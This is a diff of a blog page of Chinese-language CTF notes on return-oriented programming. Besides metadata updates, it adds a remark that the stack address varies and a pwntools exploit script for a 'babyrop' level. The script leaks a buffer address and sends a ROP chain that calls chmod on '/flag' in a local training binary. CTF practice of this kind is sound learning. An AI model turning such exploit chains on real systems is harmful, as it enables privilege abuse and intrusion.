@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220505210342026.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220505165437735.png">
 <meta property="article:published_time" content="2022-01-16T14:00:00.000Z">
-<meta property="article:modified_time" content="2022-05-05T13:55:09.762Z">
+<meta property="article:modified_time" content="2022-05-05T14:45:54.657Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary_large_image">
@@ -217,7 +217,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      59k 字
+      60k 字
     </span>
   
 
@@ -226,7 +226,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      740 分钟
+      746 分钟
     </span>
   
 
@@ -1533,7 +1533,9 @@
 
 <p>利用这几个gadgets就可以实现chmod系统调用了. (或者execve)</p>
 <p>rdi是’/flag’字符串的地址, 存在栈上. 鉴于栈空间会不断的减少, 就存在challenge的栈帧中. <code>rbp=0x7fffffffe1e0</code> </p>
-<p>好吧, 这栈地址会变化的.</p>
+<p>好吧, 这栈地址会变化的. 大意了, 栈帧底部有一个变量.</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level4.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(binary)<br>p.recvuntil(<span class="hljs-string">b&#x27; at: 0x&#x27;</span>)<br>buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>rbp = buf + <span class="hljs-number">0x50</span><br>log.info(<span class="hljs-built_in">hex</span>(rbp))<br>sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">init-pwndbg</span><br><span class="hljs-string">si</span><br><span class="hljs-string">b *challenge+86</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>pl = flat([<span class="hljs-string">b&#x27;/flag\x00&#x27;</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">6</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0x4015fb</span>, buf, <span class="hljs-number">0x40161b</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x40160c</span>, <span class="hljs-number">90</span>, <span class="hljs-number">0x4015e3</span>])<br>p.sendline(pl)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>
+
 <h4 id="level5-4"><a href="#level5-4" class="headerlink" title="level5"></a>level5</h4><p>这和上一题区别何在? 干脆都做一遍.</p>
 <h1 id="module-B"><a href="#module-B" class="headerlink" title="module B"></a>module B</h1><p>Dynamic Allocators:</p>
 <ul>
